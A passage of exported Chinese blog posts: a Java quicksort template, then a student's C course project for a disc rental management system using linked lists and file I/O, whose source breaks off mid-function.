    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>快速排序属于性能较好的排序算法，能够将平均的时间复杂度趋于<code>O(nlogn)</code>，而空间复杂度为<code>O(1)</code>。<a id="more"></a></p>
<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>, key = array[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[j] &lt; key) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(i, j, array);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(l, i, array);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>, array);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r, array);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = array[i];</span><br><span class="line">    array[i] = array[j];</span><br><span class="line">    array[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>不过<code>JDK</code>自带的<code>Arrays.sort()</code>不香么，除非题目限制不可以使用吧</strong></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>快速排序</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次C语言程序设计</title>
    <url>/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>那是一个闷热的下午，正值期末复习之际，突然手机响了：<a id="more"></a></p>
<p><img src="https://q.yalexin.top/%E8%81%8A%E5%A4%A9%E6%88%AA%E5%9B%BE.png" alt></p>
<p>然后因为是高中同桌兼舍友，所以就立马接了下来。但是当时我这边刚好是准备考试，所以时间上肯定不充裕，原本是想着两三天写出来，但是最后发现一天左右就完成了。但是功能并没有完全实现，还差最后的功能没有做出来，也没有过多的测试。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://q.yalexin.top/%E9%A2%98%E7%9B%AE.jpg" alt></p>
<p>其实C语言很多课程设计题目大多是使用结构体+文件操作（不排除大神的课设做得很复杂的情况），我当年拿到的就是学生成绩管理系统，对！就是这种烂大街的题目，这类题也是使用结构体+文件操作就可以解决，但是当时年少不知事，文件操作我自己一直掌握得不好，所以当时的程序无法保存数据~~，当时我还写了好久，在界面美观（狗屁美观，现在想想就是太花里胡哨了，在黑框里谈啥美观）上。所以本次课设，我就不考虑啥美观了，毕竟时间有限，能力也有限，简单构思了几分钟后，就根据整体框架设计结构体了，然后…………</p>
<h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-26 15:12:01</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-27 15:09:36</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\maoning\1.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DiscInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> country[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> type[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> director[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> producer[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> stars[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">int</span> inventory;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DiscInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; DiscInfo;</span><br><span class="line"><span class="comment">// 每一条借阅记录</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RentInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> CId;</span><br><span class="line">    <span class="keyword">char</span> DName[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> BDate;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> RDate;</span><br><span class="line">    <span class="keyword">long</span> rentNum;</span><br><span class="line">    <span class="keyword">int</span> isReturn;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">RentInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; RentInfo;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Blist</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> DName[<span class="number">50</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Blist</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Blist;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CustomerInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> acount;</span><br><span class="line">    Blist *RentList;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CustomerInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; CustomerInfo;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerInitial</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"customer.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt not exist！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            CustomerInfo *cRead = (CustomerInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CustomerInfo));</span><br><span class="line">            cRead-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line">            cRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            cRead-&gt;id = id;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, cRead-&gt;name);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;cRead-&gt;acount);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">strcmp</span>(<span class="built_in">buffer</span>, <span class="string">"END"</span>)) &#123;</span><br><span class="line">                Blist *b = (Blist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Blist));</span><br><span class="line">                <span class="built_in">strcpy</span>(b-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                b-&gt;next = cRead-&gt;RentList;</span><br><span class="line">                cRead-&gt;RentList = b;</span><br><span class="line">                <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            cRead-&gt;next = (*L);</span><br><span class="line">            (*L) = cRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n读取到的顾客信息：\n\n"</span>);</span><br><span class="line">        CustomerInfo *c = *L;</span><br><span class="line">        <span class="keyword">while</span> (c != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%ld %s %ld"</span>, c-&gt;id, c-&gt;name, c-&gt;acount);</span><br><span class="line">            Blist *b = c-&gt;RentList;</span><br><span class="line">            <span class="keyword">while</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" %s"</span>, b-&gt;DName);</span><br><span class="line">                b = b-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">            c = c-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discInitial</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">500</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">"disc.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"disc.txt not exist！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            DiscInfo *dRead = (DiscInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DiscInfo));</span><br><span class="line">            dRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(dRead-&gt;name, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;country);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;type);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;director);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;producer);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;stars);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%d"</span>, &amp;dRead-&gt;inventory);</span><br><span class="line">            dRead-&gt;next = (*L);</span><br><span class="line">            *L = dRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n读取到的碟片信息：\n\n"</span>);</span><br><span class="line">        DiscInfo *d = *L;</span><br><span class="line">        <span class="keyword">while</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s %s %s %s %s %s %d\n"</span>, d-&gt;name, d-&gt;country, d-&gt;type,</span><br><span class="line">                   d-&gt;director, d-&gt;producer, d-&gt;stars, d-&gt;inventory);</span><br><span class="line">            d = d-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rentInitial</span><span class="params">(RentInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"rent.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txt not exist！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            RentInfo *rRead = (RentInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(RentInfo));</span><br><span class="line">            rRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            rRead-&gt;CId = id;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, rRead-&gt;DName);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%lld"</span>, &amp;rRead-&gt;BDate);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%lld"</span>, &amp;rRead-&gt;RDate);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;rRead-&gt;rentNum);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%d"</span>, &amp;rRead-&gt;isReturn);</span><br><span class="line">            rRead-&gt;next = *L;</span><br><span class="line">            *L = rRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n读取到的借阅信息\n\n"</span>);</span><br><span class="line">        RentInfo *r = *L;</span><br><span class="line">        <span class="keyword">while</span> (r != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%ld %s %lld %lld %ld %d\n"</span>, r-&gt;CId, r-&gt;DName, r-&gt;BDate,</span><br><span class="line">                   r-&gt;RDate, r-&gt;rentNum, r-&gt;isReturn);</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discAdd</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *newDisc = (DiscInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DiscInfo));</span><br><span class="line">    newDisc-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟名字:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟国家:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;country);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟类型:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;type);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟导演:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;director);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟制片人:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;producer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟主演明星(如有多个，每个明星之间以空格隔开):\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    fgets(newDisc-&gt;stars, <span class="keyword">sizeof</span>(newDisc-&gt;stars), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟库存量:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;newDisc-&gt;inventory);</span><br><span class="line">    <span class="keyword">if</span> (*L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *L = newDisc;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newDisc-&gt;next = *L;</span><br><span class="line">        *L = newDisc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"添加完毕\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discQuery</span><span class="params">(DiscInfo *L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *p = L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要查询的碟片名字:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;inventory &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"可以借阅！\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"不可以借阅，因为库存为零\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不存在该影碟"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discDelete</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((*L) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"还没有用户，无法删除!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    DiscInfo *p1 = (*L)-&gt;next, *p2 = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要删除的碟片名字:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="comment">// 删除头节点</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((*L)-&gt;name, query)) &#123;</span><br><span class="line">        (*L) = (*L)-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p1-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"不存在该影片\n"</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p2-&gt;next = p1-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p1);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discModify</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *p = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要修改的碟片的名字:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟国家:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;country);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟类型:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;type);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟导演:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;director);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟制片人:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;producer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟主演明星(如有多个，每个明星之间以空格隔开):\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        fgets(p-&gt;stars, <span class="keyword">sizeof</span>(p-&gt;stars), <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟库存量:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p-&gt;inventory);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不存在该影碟"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerAdd</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    CustomerInfo *newCustomer = (CustomerInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CustomerInfo));</span><br><span class="line">    newCustomer-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顾客名字：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newCustomer-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顾客账户id：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;newCustomer-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顾客账户金额：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;newCustomer-&gt;acount);</span><br><span class="line">    newCustomer-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (*L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *L = newCustomer;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newCustomer-&gt;next = *L;</span><br><span class="line">        *L = newCustomer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"添加完毕\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerDelete</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((*L) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"还没有用户，无法删除!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    CustomerInfo *p1 = (*L)-&gt;next, *p2 = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要删除的顾客名字：\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="comment">// 删除头节点</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((*L)-&gt;name, query)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*L)-&gt;RentList != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"该用户还未归还借阅的碟片，不能删除用户\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            (*L) = (*L)-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p2);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p1-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"不存在该用户\n"</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1-&gt;RentList != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"该用户还未归还借阅的碟片，不能删除用户\n"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p2-&gt;next = p1-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(p1);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerModify</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    CustomerInfo *p = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要修改的顾客的账户id：\n"</span>);</span><br><span class="line">    <span class="keyword">long</span> query;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (query != p-&gt;id) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新顾客名字:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新顾客账户金额:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;p-&gt;acount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不存在该用户"</span>);</span><br><span class="line">    system(<span 